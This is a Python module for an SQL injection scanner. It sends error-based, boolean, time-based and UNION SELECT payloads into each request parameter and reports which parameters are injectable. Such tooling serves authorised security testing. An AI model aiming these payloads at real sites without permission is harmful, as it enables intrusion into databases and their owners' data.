import time
import requests
from utils import (
    BASIC_PAYLOADS,
    SLEEP_PAYLOADS,
    detect_database,
    similarity_ratio,
    send_request,
    send_request_timed
)


def injections(data, payload):
    for param in data:
        mutated = data.copy()
        mutated[param] = str(data[param]) + payload
        yield param, mutated


def error_based_detection(url, data, method):
    print("    [*] Testing Error-based SQLi...")
    results = []

    for payload in BASIC_PAYLOADS:
        for param, mutated in injections(data, payload):
            try:
                response = send_request(url, mutated, method)
                db_type = detect_database(response.text)

                if db_type != "Unknown":
                    results.append({
                        'type': 'Error-based',
                        'payload': payload,
                        'param': param,
                        'database': db_type
                    })
                    print(f"        [!] ERROR-BASED SQLi DETECTED on `{param}`!")
                    print(f"        Payload:  {payload}")
                    print(f"        Database: {db_type}")
            except Exception:
                continue

    if not results:
        print("        [✓] No error-based vulnerabilities found")
    return results


def boolean_based_detection(url, data, method):
    print("\n    [*] Testing Boolean-based SQLi...")
    results = []

    boolean_tests = [
        # string
        ("' AND '1'='1'-- ", "' AND '1'='2'-- "),
        # numeric
        (" AND 1=1-- ", " AND 1=2-- "),
    ]

    for param in data:
        print(f"        [*] Testing parameter: {param}")

        # Baseline for THIS parameter
        baseline_data = data.copy()
        try:
            baseline_resp = send_request(url, baseline_data, method)
            baseline_text = baseline_resp.text
        except Exception:
            print(f"        [✗] Failed baseline for `{param}`")
            continue

        for true_payload, false_payload in boolean_tests:
            true_data = data.copy()
            false_data = data.copy()

            true_data[param] = str(data[param]) + true_payload
            false_data[param] = str(data[param]) + false_payload

            try:
                true_resp = send_request(url, true_data, method)
                false_resp = send_request(url, false_data, method)
            except Exception:
                continue

            true_sim = similarity_ratio(baseline_text, true_resp.text)
            false_sim = similarity_ratio(baseline_text, false_resp.text)
            tf_sim = similarity_ratio(true_resp.text, false_resp.text)

            print(
                f"        [{param}] TRUE≈BASE: {true_sim:.2f}  "
                f"FALSE≈BASE: {false_sim:.2f}  TRUE≠FALSE: {tf_sim:.2f}"
            )

            if true_sim > 0.85 and tf_sim < 0.75:
                print(f"        [!] BOOLEAN-BASED SQLi DETECTED on `{param}`!")
                results.append({
                    'type': 'Boolean-based Blind',
                    'param': param,
                    'payloads': f"{true_payload} / {false_payload}",
                    'true_similarity': f"{true_sim:.2f}",
                    'true_false_similarity': f"{tf_sim:.2f}"
                })
                break 

    if not results:
        print("        [✓] No boolean-based vulnerabilities found")

    return results


def time_based_detection(url, data, method):
    print("\n    [*] Testing Time-based SQLi...")

    try:
        start = time.time()
        send_request(url, data, method)
        baseline_time = time.time() - start
    except Exception:
        baseline_time = 1.0

    print(f"        Baseline time: {baseline_time:.2f}s")

    for payload in SLEEP_PAYLOADS:
        for param, mutated in injections(data, payload):
            try:
                start = time.time()
                send_request_timed(url, mutated, method, timeout=15)
                elapsed = time.time() - start
                delay = elapsed - baseline_time

                print(f"        [{param}] {payload} → {elapsed:.2f}s (delay: {delay:.2f}s)")

                if delay > 4:
                    print(f"        [!] TIME-BASED SQLi DETECTED on `{param}`!")
                    return [{
                        'type': 'Time-based Blind',
                        'payload': payload,
                        'param': param,
                        'delay': f"{delay:.2f}s"
                    }]

            except requests.Timeout:
                print(f"        [{param}] {payload} → TIMEOUT")
                print(f"        [!] TIME-BASED SQLi DETECTED on `{param}`!")
                return [{
                    'type': 'Time-based Blind',
                    'payload': payload,
                    'param': param,
                    'delay': 'timeout'
                }]
            except Exception:
                continue

    print("        [✓] No time-based vulnerabilities found")
    return []


def union_based_detection(url, data, method):
    print("\n    [*] Testing UNION-based SQLi...")
    results = []

    for param in data.keys():
        print(f"        [*] Testing parameter: {param}")
        
        # Finding number of columns using ORDER BY
        column_count = find_column_count(url, data, param, method)
        
        if column_count is None or column_count < 1:
            print(f"        [✗] Could not determine column count for `{param}`")
            continue
        
        print(f"        [+] Detected {column_count} column(s)")
        
        # Test UNION SELECT
        vuln = test_union_select(url, data, param, method, column_count)
        
        if vuln:
            print(f"        [!] UNION-BASED SQLi DETECTED on `{param}`!")
            print(f"        Columns: {column_count}")
            results.append(vuln)

    if not results:
        print("        [✓] No UNION-based vulnerabilities found")
    return results


def find_column_count(url, data, param, method, max_cols=10):
    for col in range(1, max_cols + 1):
        payload = f"' ORDER BY {col}--"
        mutated = data.copy()
        mutated[param] = str(data[param]) + payload
        
        try:
            response = send_request(url, mutated, method)
            
            error_indicators = [
                'unknown column',
                'out of range',
                'invalid column',
            ]
            
            response_lower = response.text.lower()
            if any(indicator in response_lower for indicator in error_indicators):
                return col - 1
                
        except Exception:
            # If request fails, assume we exceeded column count
            return col - 1
    
    return None


def test_union_select(url, data, param, method, column_count):
    markers = [1337, 7331, 9001, 4242, 8888, 1111, 2222, 3333, 4444, 5555]
    
    # Pad markers to match column count
    marker_values = [str(markers[i % len(markers)]) for i in range(column_count)]
    marker_string = ','.join(marker_values)
    
    union_tests = [
        f"' UNION SELECT {marker_string}--",
        f"' UNION ALL SELECT {marker_string}--",
        f"' UNION SELECT {marker_string}#",
    ]
    
    for payload in union_tests:
        mutated = data.copy()
        mutated[param] = str(data[param]) + payload
        
        try:
            response = send_request(url, mutated, method)
            response_text = response.text
            
            markers_found = [m for m in marker_values if m in response_text]
            
            if markers_found:
                return {
                    'type': 'UNION-based',
                    'payload': payload,
                    'param': param,
                    'columns': column_count,
                    'markers_found': markers_found
                }
                
        except Exception:
            continue
    
    return None


def run_all_detectors(url, data, method):
    results = []
    results.extend(error_based_detection(url, data, method))
    results.extend(boolean_based_detection(url, data, method))
    results.extend(time_based_detection(url, data, method))
    results.extend(union_based_detection(url, data, method))
    return results